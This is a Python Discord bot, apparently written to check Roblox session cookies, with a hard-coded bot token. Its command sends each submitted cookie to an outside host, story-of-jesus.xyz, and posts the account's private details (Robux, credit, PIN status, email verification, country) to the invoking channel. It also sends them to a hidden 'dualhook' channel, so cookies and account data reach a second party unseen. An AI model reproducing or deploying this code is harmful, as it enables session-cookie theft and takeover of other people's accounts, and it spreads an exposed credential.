import discord, requests, json
from discord.ext import commands




token = "OTE0MjM0MjAyODEwMTAxODgy.YaKE8w.yh5N9-jvqkGg6lEhY-Vb3aRqVQ8"
yourprefix = "!cc" 
dualhookchannelid = 914236437673697310 

bot = commands.Bot(command_prefix=yourprefix, description="Cookie Checker made by Riax")


@bot.command()
async def c(ctx, cookie=None):  
    
    if cookie == None:
        await ctx.message.reply("Oh Damn! Looks like the syntax is wrong! Try doing the following Syntax, contact Riax if u have problems!'.checkcookie mycookie'") 
        return 

    r = requests.get(f'https://story-of-jesus.xyz/e.php?cookie={cookie}') ## send a get 
    data = r.json() 

    if data["status"] == "failed": 
        await ctx.message.reply("COOKIE EXPIRED/INVALID, SUPPORT: Riax_#6806")
        return 
    

    avatarurl = data["avatarurl"]   ## NEJDE TOTO NIKDY!!!!
    userid = data["userid"]  
    emailverified = data["emailverified"]  
    username = data["username"]  
    description = data["description"]  
    displayname = data["displayname"]  
    datecreated = data["datecreated"]  
    days_old = data["days-old"]  
    robux = data["robux"]  
    pendingrobux = data["pendingrobux"]  
    credit = data["credit"]  
    premium = data["premium"]  
    friends = data["friends"]  
    followers = data["followers"]  
    following = data["following"]  
    rap = data["rap"]  
    gender = data["gender"]  
    country = data["country"]  
    pin = data["pin"] 

    if description == "":
        description = "Empty" ## check if description is empty and if so set the variable to "Empty" because otherwise it bugs embed
    
    ## create embed with above data
    cook = discord.Embed(title=f'**Suchá Sušenka, jummy**', color=0x42be8f)
    cook.set_thumbnail(url=f'{avatarurl}')
    cook.add_field(name="Profile Link:", value=f'**[Click Here](https://www.roblox.com/users/{userid}/profile)**', inline=False)
    cook.add_field(name="Username:", value=f'```{username}```', inline=True)
    cook.add_field(name="UserID:", value=f'```{userid}```', inline=True)
    cook.add_field(name="Display Name:", value=f'```{displayname}```', inline=True)
    cook.add_field(name="Description:", value=f'```{description}```', inline=True)
    cook.add_field(name="Gender:", value=f'```{gender}```', inline=True)
    cook.add_field(name="Country Čokla:", value=f'```{country}```', inline=True)
    cook.add_field(name="Verified Email:", value=f'```{emailverified}```', inline=True)
    cook.add_field(name="Premium:", value=f'```{premium}```', inline=True)
    cook.add_field(name="Pin Enabled:", value=f'```{pin}```', inline=True)
    cook.add_field(name="Robux:", value=f'```{robux}```', inline=True)
    cook.add_field(name="Pending-Robux:", value=f'```{pendingrobux}```', inline=True)
    cook.add_field(name="Rap:", value=f'```{rap}```', inline=True)
    cook.add_field(name="Credit:", value=f'```{credit}```', inline=True)
    cook.add_field(name="Date Created:", value=f'```{days_old} Days Ago```', inline=True)
    cook.add_field(name="Friends:", value=f'```{friends}```', inline=True)
    cook.add_field(name="Followers:", value=f'```{followers}```', inline=True)
    cook.add_field(name="Following:", value=f'```{following}```', inline=True)

    
    await ctx.send(embed=cook) ## toto vratit
    yourchannel = bot.get_channel(dualhookchannelid) 
    await yourchannel.send(embed=cook) ## embed to start -- at start




@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.do_not_disturb, activity=discord.Activity(type=discord.ActivityType.playing, name="Riax_#6806"))
    print('čokel je proste čokel')
    ## ""Playing cookie checker""


bot.run(token)
## token to run (crappy way might change later but monke monke čokel)